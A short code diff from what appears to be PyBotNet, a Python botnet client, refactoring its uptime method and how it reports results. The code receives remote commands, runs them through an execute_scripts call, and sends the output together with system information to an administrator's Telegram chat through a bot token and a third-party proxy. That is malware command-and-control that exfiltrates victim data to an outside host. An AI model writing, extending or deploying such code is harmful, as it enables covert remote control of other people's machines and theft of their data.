@@ -40,14 +40,14 @@ class PyBotNet:
     def __str__(self) -> str:
         return settings.pybotnet_info
 
-    def pybotname_up_time(self) -> int:
+    def pybotnet_up_time(self) -> int:
         return util.get_current_epoc_time() - self.start_time
 
     def send_message_by_third_party_proxy(self, message):
         '''Send messages by api url and third party proxy to adimn'''
 
         if self.send_system_data:
-            message = f'{message} \n {util.get_short_system_info(self.pybotname_up_time())}'
+            message = f'{message} \n\n {util.get_short_system_info()}'
 
         self.api_url = util.make_send_message_api_url(
             self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, message)
@@ -89,7 +89,8 @@ class PyBotNet:
                     f'command received: \n{self.command}')
 
                 self.output = scripts.execute_scripts(
-                    self.command, self.logger)
+                    self.command, self.pybotnet_up_time(), self.logger)
 
                 if self.output:
-                    self.send_message_by_third_party_proxy(self.output)
+                    self.send_message_by_third_party_proxy(
+                        f'output: \n{self.output}')
